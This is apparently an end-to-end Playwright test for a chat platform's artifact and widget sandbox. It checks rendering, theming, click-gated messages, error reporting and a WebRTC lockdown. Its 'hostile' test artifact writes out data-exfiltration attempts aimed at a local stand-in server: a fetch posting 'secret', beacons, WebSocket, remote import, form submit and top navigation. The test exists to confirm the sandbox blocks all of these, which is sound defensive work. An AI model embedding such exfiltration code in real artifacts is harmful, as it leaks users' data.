// 3.5.9: artifacts and widgets in a real browser. A widget in an answer (the humidity calculator):
// drawn, its height following its content, the theme following the page's, its button sending a
// message after a click and refused (asked in a strip) without one. An artifact in the canvas (a
// CSV explorer in React with JSX compiled by the server, libraries offline): App and Source; one
// with errors, counted and reported to the server; a hostile one whose ways out are all blocked
// (a local "outside" server must hear nothing). Screenshots light and dark, desktop and phone.
// 3.5.10: WebRTC off. Hostile artifacts try every way to a peer connection (webrtc-hostile.mjs);
// a STUN listener must hear nothing; a legit artifact with three and d3 still draws.
// Usage: DEMO_ARTIFACTS=1 node demo-server.mjs 7659, then
//        [CHROMIUM=/path/to/chrome] node artifacts-e2e.mjs <url> <token> <outdir> <widgetSession> <artifactSession> <godId>
// Exits 1 on a failure.
import { createSocket } from "node:dgram";
import { mkdir, writeFile as writeLocal } from "node:fs/promises";
import { createServer } from "node:http";
import { join } from "node:path";
import { chromium } from "playwright-core";
import { CHILD_WAYS, webrtcDocWrite, webrtcFrameset, webrtcHostile } from "./webrtc-hostile.mjs";

const [url, token, out, widgetSession, artifactSession, godId] = process.argv.slice(2);
await mkdir(out, { recursive: true });
const auth = { authorization: `Bearer ${token}`, "content-type": "application/json" };
const api = async (method, path, body) => {
  const r = await fetch(`${url}${path}`, {
    method,
    headers: auth,
    ...(body && { body: JSON.stringify(body) }),
  });
  return { status: r.status, body: await r.json().catch(() => null) };
};

// The "internet": every request it gets is a leak.
const heard = [];
const outside = createServer((req, res) => {
  heard.push(`${req.method} ${req.url}`);
  res.writeHead(200, { "access-control-allow-origin": "*", "content-type": "text/plain" });
  res.end("x");
});
outside.on("upgrade", (req, socket) => {
  heard.push(`UPGRADE ${req.url}`);
  socket.destroy();
});
await new Promise((r) => outside.listen(0, "127.0.0.1", r));
const ext = `http://localhost:${outside.address().port}`;
// WebRTC: a STUN server outside would get a binding request.
const stun = createSocket("udp4");
const stunHeard = [];
stun.on("message", (_m, from) => stunHeard.push(`${from.address}:${from.port}`));
await new Promise((r) => stun.bind(0, "127.0.0.1", r));
const stunPort = stun.address().port;
const head = (name) => `<!-- redgiant-artifact {"name":"${name}","version":1} -->\n`;
const legit = `<!-- redgiant-artifact {"name":"Scena","version":1,"libs":["three","d3"]} -->
<!doctype html><html lang="it"><head><title>Scena</title></head><body><div id="d3"></div><div id="three"></div>
<script type="module">
import * as THREE from "three";
import * as d3 from "d3";
const r = {};
d3.select("#d3").append("svg").attr("width", 120).attr("height", 40).selectAll("rect").data([10, 30, 20]).join("rect").attr("x", (_d, i) => i * 40).attr("y", (d) => 40 - d).attr("width", 30).attr("height", (d) => d).attr("fill", "#d23a2c");
r.d3 = document.querySelectorAll("#d3 rect").length === 3;
try {
  const renderer = new THREE.WebGLRenderer({ antialias: true });
  renderer.setSize(160, 100);
  document.getElementById("three").append(renderer.domElement);
  const scene = new THREE.Scene(), camera = new THREE.PerspectiveCamera(50, 1.6, 0.1, 10);
  camera.position.z = 3;
  scene.add(new THREE.Mesh(new THREE.BoxGeometry(), new THREE.MeshNormalMaterial()));
  renderer.render(scene, camera);
  r.three = renderer.domElement.width > 0;
} catch (e) { r.three = "no WebGL here: " + e.message; r.threeLoaded = typeof THREE.Scene === "function"; }
top.postMessage({ legit: r }, "*");
</script></body></html>`;
const hostile = `<!-- redgiant-artifact {"name":"Ostile","version":1} -->
<!doctype html><html><head><title>Ostile</title>
<link rel="stylesheet" href="${ext}/sheet.css"><script src="${ext}/script.js"></script>
<style>@font-face{font-family:x;src:url("${ext}/font")}body{font-family:x;background:url("${ext}/bg")}</style>
</head><body><h1>Prova ostile</h1><ul id="log"></ul>
<img src="${ext}/img"><iframe src="${ext}/frame"></iframe>
<form id="f" method="post" action="${ext}/form"><input name="a" value="secret"></form>
<script>
const r = {};
const out = (k, v) => { r[k] = v; const li = document.createElement("li"); li.textContent = k + ": " + v; document.getElementById("log").append(li); };
(async () => {
  try { await fetch(${JSON.stringify(ext)} + "/fetch", { method: "POST", body: "secret", mode: "no-cors" }); out("fetch", "SENT"); } catch (e) { out("fetch", "blocked"); }
  try { await fetch("/api/sessions"); out("fetchRedGiant", "SENT"); } catch (e) { out("fetchRedGiant", "blocked"); }
  try { out("beacon", navigator.sendBeacon(${JSON.stringify(ext)} + "/beacon", "s") ? "queued (the outside server says if it went)" : "blocked"); } catch (e) { out("beacon", "blocked"); }
  await new Promise((ok) => { const i = new Image(); i.onload = () => { out("img", "LOADED"); ok(); }; i.onerror = () => { out("img", "blocked"); ok(); }; i.src = ${JSON.stringify(ext)} + "/img2"; });
  await new Promise((ok) => { try { const w = new WebSocket(${JSON.stringify(ext.replace("http", "ws"))} + "/ws"); w.onopen = () => { out("ws", "OPEN"); ok(); }; w.onerror = () => { out("ws", "blocked"); ok(); }; } catch (e) { out("ws", "blocked"); ok(); } });
  try { await import(${JSON.stringify(ext)} + "/module.js"); out("import", "LOADED"); } catch (e) { out("import", "blocked"); }
  try { localStorage.setItem("a", "1"); out("storage", "OPEN"); } catch (e) { out("storage", "blocked"); }
  try { new Worker(URL.createObjectURL(new Blob(["fetch('${ext}/worker')"]))); out("worker", "made"); } catch (e) { out("worker", "blocked"); }
  const w = window.open(${JSON.stringify(ext)} + "/open"); out("open", w ? "OPENED" : "handed to the page");
  try { top.location.href = ${JSON.stringify(ext)} + "/top"; out("top", "tried"); } catch (e) { out("top", "blocked"); }
  out("done", "yes");
  setTimeout(() => { try { document.getElementById("f").submit(); } catch (e) {} }, 4000);
  setTimeout(() => { location.href = ${JSON.stringify(ext)} + "/selfnav"; }, 6000);
})();
</script></body></html>`;
for (const [path, content] of [
  ["artefatti/ostile-e2e.html", hostile],
  ["artefatti/rtc-ostile.html", webrtcHostile(stunPort, head("WebRTC ostile"))],
  ["artefatti/rtc-doc.html", webrtcDocWrite(stunPort, head("WebRTC document.open"))],
  ["artefatti/rtc-frameset.html", webrtcFrameset(stunPort, head("WebRTC frameset"))],
  ["artefatti/scena-3d.html", legit],
]) {
  const w = await api("PUT", "/api/files/content", { scope: "platform", path, content });
  if (w.status !== 200) throw new Error(`write ${path}: ${w.status} ${JSON.stringify(w.body)}`);
}

let failed = false;
const check = (ok, what) => {
  console.log(`${ok ? "ok  " : "FAIL"} ${what}`);
  if (!ok) failed = true;
};

const browser = await chromium.launch(
  process.env.CHROMIUM ? { executablePath: process.env.CHROMIUM } : {},
);

const tabsFor = (sessionId, title) =>
  JSON.stringify({
    tabs: [{ id: `chat:${sessionId}`, type: "chat", title, sessionId, agentId: godId }],
    active: `chat:${sessionId}`,
  });

async function open(scheme, viewport, sessionId, title) {
  const context = await browser.newContext({ viewport, colorScheme: scheme, locale: "it-IT" });
  const page = await context.newPage();
  page.on("pageerror", (e) => console.error("pageerror:", e.message));
  await page.goto(`${url}/#token=${token}`);
  await page.evaluate(
    ([tabs]) => {
      localStorage.setItem("rg.remoteNotice", "hidden");
      localStorage.setItem("rg.newsSeen", "3.5.8");
      localStorage.setItem("rg.tabs", tabs);
      localStorage.removeItem("rg.canvas");
    },
    [tabsFor(sessionId, title)],
  );
  await page.goto(`${url}/#token=${token}`);
  await page.waitForSelector(".bar");
  await page.waitForTimeout(600);
  const close = page.locator("[role=dialog] button[aria-label]").first();
  if (await page.locator("[role=dialog]").count()) await close.click().catch(() => {});
  // The conversation, from God's list on the left.
  const row = page.locator(".sessions button.open", { hasText: title }).first();
  if (viewport.width > 800) await row.click();
  else {
    // The phone: the conversations are in the drawer.
    await page
      .locator(".top button[aria-label]")
      .first()
      .click()
      .catch(() => {});
    await page.waitForTimeout(400);
    await row.click({ timeout: 5000 }).catch(() => {});
  }
  return { page, context };
}

// ---- 1. the widget -------------------------------------------------------------------------
for (const scheme of ["light", "dark"]) {
  const { page, context } = await open(
    scheme,
    { width: 1400, height: 900 },
    widgetSession,
    "Che umidità",
  );
  const card = page.locator(".widget-card").first();
  await card.waitFor();
  const frame = card.locator("iframe");
  await page.frameLocator(".widget-card iframe").locator("#out").waitFor();
  await page.waitForTimeout(800);
  const h = await frame.evaluate((f) => f.getBoundingClientRect().height);
  check(h > 100 && h < 0.7 * 900, `${scheme}: the widget's height follows its content (${h}px)`);
  const result = await page.frameLocator(".widget-card iframe").locator("#out").textContent();
  check(/%$/.test(result ?? ""), `${scheme}: the widget computes (${result})`);
  const bg = await page
    .frameLocator(".widget-card iframe")
    .locator("input#ti")
    .evaluate((i) => getComputedStyle(i.closest(".rg-input") ?? i).backgroundColor);
  console.log(`     ${scheme}: input background ${bg}`);
  check(
    scheme === "dark" ? bg === "rgb(28, 31, 38)" : bg === "rgb(255, 255, 255)",
    `${scheme}: the widget takes the page's theme`,
  );
  await page.screenshot({ path: join(out, `${scheme}-1-widget.png`) });
  if (scheme === "light") {
    // Theme switch while it runs: the page goes dark, the widget follows.
    await page.evaluate(() => {
      document.documentElement.dataset.theme = "dark";
      localStorage.setItem("rg.theme", "dark");
    });
    await page.evaluate(() => window.dispatchEvent(new Event("storage")));
    // The page's own switch (Settings) sets the signal; here the change is sent by the frame bridge.
    await page.emulateMedia({ colorScheme: "dark" });
    await page.waitForTimeout(600);
    const bg2 = await page
      .frameLocator(".widget-card iframe")
      .locator("input#ti")
      .evaluate((i) => getComputedStyle(i.closest(".rg-input") ?? i).backgroundColor);
    check(bg2 === "rgb(28, 31, 38)", `the widget follows a theme switch (${bg2})`);
    await page.screenshot({ path: join(out, "light-1b-widget-after-switch.png") });

    // No click: a message the widget sends by itself waits in the strip.
    const before = (await api("GET", `/api/sessions/${widgetSession}/events`)).body.filter(
      (e) => e.type === "message.user",
    ).length;
    await page
      .frameLocator(".widget-card iframe")
      .locator("body")
      .evaluate(() => setTimeout(() => window.redgiant.sendMessage("Mandato da solo"), 2000));
    await page.mouse.click(5, 5);
    await page.waitForTimeout(2800);
    const strip = page.locator(".artifact-ask");
    check((await strip.count()) === 1, "a message with no click waits under the widget");
    await page.screenshot({ path: join(out, "light-2-widget-asks.png") });
    await strip.locator("button", { hasText: "Lascia stare" }).click();
    const afterNo = (await api("GET", `/api/sessions/${widgetSession}/events`)).body.filter(
      (e) => e.type === "message.user",
    ).length;
    check(afterNo === before, "«Lascia stare»: nothing sent");

    // A click on its button: sent at once, as the person's, marked.
    await page.frameLocator(".widget-card iframe").locator("#te").fill("2");
    await page.mouse.click(5, 5);
    await page.frameLocator(".widget-card iframe").locator("#go").click();
    await page.waitForTimeout(2500);
    const users = (await api("GET", `/api/sessions/${widgetSession}/events`)).body.filter(
      (e) => e.type === "message.user",
    );
    const last = users.at(-1)?.payload;
    check(
      users.length === before + 1 &&
        last?.via === "artifact" &&
        last?.text.startsWith("Analizza la mia situazione"),
      `the button sends after a click (${last?.text?.slice(0, 60)}…)`,
    );
    check((await page.locator(".via-artifact").count()) >= 1, "the message shows «da un widget»");
    await page.waitForTimeout(500);
    await page.screenshot({ path: join(out, "light-3-widget-sent.png") });
    // Typing in it, then pressing the button a while later (focus already inside, no new blur
    // for the page): the browser's own activation from the click counts.
    await page.waitForTimeout(5500);
    await page.frameLocator(".widget-card iframe").first().locator("#ui").fill("75");
    await page.waitForTimeout(2000);
    await page.frameLocator(".widget-card iframe").first().locator("#go").click();
    await page.waitForTimeout(2500);
    const users2 = (await api("GET", `/api/sessions/${widgetSession}/events`)).body.filter(
      (e) => e.type === "message.user",
    );
    check(users2.length === users.length + 1, "after typing in it, the button still sends");
  }
  await context.close();
}

// Phone: full width.
{
  const { page, context } = await open(
    "light",
    { width: 390, height: 844 },
    widgetSession,
    "Che umidità",
  );
  await page.locator(".widget-card").first().waitFor();
  await page.frameLocator(".widget-card iframe").first().locator("#out").waitFor();
  await page.waitForTimeout(800);
  await page.locator(".widget-card").first().scrollIntoViewIfNeeded();
  await page.frameLocator(".widget-card iframe").first().locator("#go").scrollIntoViewIfNeeded();
  await page.waitForTimeout(800);
  const width = await page
    .locator(".widget-card")
    .first()
    .evaluate((e) => e.getBoundingClientRect().width);
  check(width > 330, `phone: the widget takes the width (${width}px)`);
  await page.screenshot({ path: join(out, "phone-1-widget.png") });
  await context.close();
}

// ---- 2. the artifacts in the canvas --------------------------------------------------------
for (const scheme of ["light", "dark"]) {
  const { page, context } = await open(
    scheme,
    { width: 1440, height: 900 },
    artifactSession,
    "artefatti/esplora-csv",
  );
  // The agent showed it: its line in the chat opens it in the canvas, as an artifact, App first.
  await page.locator(".canvas-line", { hasText: "esplora-csv.html" }).first().click();
  await page.waitForSelector(".canvas .artifact-frame iframe", { timeout: 20000 });
  const app = page.frameLocator(".canvas .artifact-frame iframe");
  await app.locator("table td").first().waitFor({ timeout: 30000 });
  check(
    (await app.locator("tbody tr").count()) === 6,
    `${scheme}: the CSV explorer (React, JSX) runs`,
  );
  await app.locator("canvas").waitFor();
  await page.waitForTimeout(800);
  await page.screenshot({ path: join(out, `${scheme}-4-artifact-app.png`) });
  if (scheme === "light") {
    await page.locator(".art-views button", { hasText: "Sorgente" }).click();
    await page.waitForSelector(".canvas .cm-content");
    await page.waitForTimeout(500);
    check(
      (await page.locator(".canvas .cm-content").textContent())?.includes("redgiant-artifact"),
      "Source: the file in the editor",
    );
    await page.screenshot({ path: join(out, "light-5-artifact-source.png") });
    await page.locator(".art-views button", { hasText: "App" }).click();
  }
  await context.close();
}

// The broken one and the hostile one, opened from the page (as the list of files does).
{
  const { page, context } = await open(
    "light",
    { width: 1440, height: 900 },
    artifactSession,
    "artefatti/esplora-csv",
  );
  const popups = [];
  page.on("popup", (p) => popups.push(p.url()));
  // Open through the files list: the explorer is the person's way.
  await page.locator('button[aria-label="File del progetto e terminale"]').click();
  await page.waitForSelector(".explorer .tree-row");
  await page.locator(".tree-row", { hasText: "artefatti" }).click();
  await page.locator(".tree-row", { hasText: "rotto.html" }).click();
  await page.waitForSelector(".canvas .artifact-errors", { timeout: 20000 });
  const count = await page.locator(".canvas .artifact-errors").textContent();
  check(/3 errori/.test(count ?? ""), `errors counted in the bar (${count})`);
  const title = await page.locator(".canvas .artifact-errors").getAttribute("title");
  console.log(`     errors: ${title?.replace(/\n/g, " | ")}`);
  check(
    /not a library RedGiant serves/.test(title ?? "") && /startTimer/.test(title ?? ""),
    "the missing library and the exception are both reported",
  );
  await page.waitForTimeout(1000);
  await page.screenshot({ path: join(out, "light-6-artifact-errors.png") });
  // Reported to the server for the conversation in front: its next message carries them.
  await page.waitForTimeout(800);
  await page.locator(".composer textarea, textarea").first().fill("Funziona il timer?");
  await page.keyboard.press("Enter");
  await page.waitForTimeout(2500);
  const asked = (await api("GET", `/api/sessions/${artifactSession}/events`)).body
    .filter((e) => e.type === "message.user")
    .at(-1);
  console.log(`     the agent read: ${JSON.stringify(asked?.payload?.notes ?? []).slice(0, 300)}`);
  check(
    JSON.stringify(asked?.payload ?? {}).includes("startTimer is not defined"),
    "the errors reach the agent with the next message",
  );

  await page.locator(".tree-row", { hasText: "ostile-e2e.html" }).click();
  await page.waitForTimeout(500);
  const hostileFrame = page.frameLocator(".canvas .artifact-frame iframe").last();
  await hostileFrame
    .locator("#log li", { hasText: "done" })
    .waitFor({ timeout: 20000 })
    .catch(async (e) => {
      await page.screenshot({ path: join(out, "light-7-artifact-hostile-FAILED.png") });
      console.log(
        "     frames:",
        page
          .frames()
          .map((f) => f.url())
          .join(" , "),
      );
      throw e;
    });
  const log = await page
    .frameLocator(".canvas .artifact-frame iframe")
    .last()
    .locator("#log")
    .textContent()
    .catch(() => "(frame gone)");
  console.log(`     hostile says: ${log}`);
  check(!/SENT|LOADED|OPEN\b|OPENED/.test(log ?? ""), "hostile artifact: no request got out");
  await page.screenshot({ path: join(out, "light-7-artifact-hostile.png") });
  // Then the form and the frame's own navigation, a few seconds later.
  await page.waitForTimeout(7000);
  check(page.url().startsWith(url), "hostile artifact: RedGiant's page stays (no top navigation)");
  check(popups.length === 0, `hostile artifact: no window opened (${popups.join(", ")})`);
  check(heard.length === 0, `the outside server heard nothing (${heard.join(", ")})`);
  await page.screenshot({ path: join(out, "light-8-artifact-hostile-after-nav.png") });
  const no = page.locator("[role=dialog] button", { hasText: "Annulla" });
  if (await no.count()) await no.first().click();
  await context.close();
}

// ---- 3. WebRTC (3.5.10): hostile artifacts in frames as the canvas makes them -------------------
{
  const { page, context } = await open(
    "light",
    { width: 1440, height: 900 },
    artifactSession,
    "artefatti/esplora-csv",
  );
  await page.evaluate(() => {
    window.__rtc = {};
    window.__got = {};
    window.__errors = [];
    addEventListener("message", (e) => {
      if (e.data?.rtc) Object.assign(window.__rtc, e.data.rtc);
      else if (e.data?.method === "redgiant/error") window.__errors.push(e.data.params);
      else if (e.data && !e.data.jsonrpc) Object.assign(window.__got, e.data);
    });
  });
  let n = 0;
  for (const path of ["rtc-ostile.html", "rtc-doc.html", "rtc-frameset.html", "scena-3d.html"]) {
    const link = await api("POST", "/api/canvas/link", {
      kind: "file",
      scope: "platform",
      path: `artefatti/${path}`,
    });
    check(link.body?.artifact === true, `${path} runs as an artifact`);
    await page.evaluate(
      ([src, i]) => {
        const f = document.createElement("iframe");
        f.src = src;
        f.setAttribute("sandbox", "allow-scripts allow-forms");
        f.style.cssText = `position:fixed;z-index:9999;left:${20 + 350 * i}px;top:80px;width:330px;height:420px;border:2px solid #e0482e;background:#fff`;
        document.body.append(f);
      },
      [link.body.url, n++],
    );
  }
  // The first artifact with three bundles it on the server (esbuild): it can take a while.
  for (let i = 0; i < 60; i++) {
    const ready = await page.evaluate(() => window.__got.legit && window.__rtc.done);
    if (ready) break;
    await page.waitForTimeout(1000);
  }
  await page.waitForTimeout(3000);
  console.log(
    `     errors reported by the artifacts: ${JSON.stringify(await page.evaluate(() => window.__errors))}`,
  );
  const rtcWays = await page.evaluate(() => window.__rtc);
  for (const w of [
    ...CHILD_WAYS,
    "frameset frame javascript:",
    "document.open + write of a new document",
  ])
    if (!(w in rtcWays)) rtcWays[w] = "(never ran)";
  console.log("     WebRTC, the ways tried in an artifact:");
  for (const [k, v] of Object.entries(rtcWays)) console.log(`       ${k}: ${v}`);
  check(rtcWays.done === "yes", "the WebRTC artifact ran to its end");
  check(
    !Object.values(rtcWays).some((v) => /MADE|natives seen/.test(String(v))),
    "no way made a peer connection in an artifact",
  );
  const got = await page.evaluate(() => window.__got);
  console.log(`     legit three + d3: ${JSON.stringify(got.legit)}`);
  check(got.legit?.d3 === true, "a legit artifact with d3 draws");
  check(
    got.legit?.three === true || got.legit?.threeLoaded === true,
    "a legit artifact with three loads (and renders where WebGL is)",
  );
  await page.screenshot({ path: join(out, "light-9-webrtc-artifacts.png") });
  check(
    stunHeard.length === 0,
    `WebRTC: the STUN server outside heard nothing (${stunHeard.length})`,
  );
  await writeLocal(
    join(out, "webrtc.json"),
    JSON.stringify({ rtcWays, legit: got.legit, stunHeard }, null, 2),
  );
  await context.close();
}

await browser.close();
outside.close();
stun.close();
console.log(failed ? "SOME CHECKS FAILED" : "ALL CHECKS PASSED");
process.exit(failed ? 1 : 0);
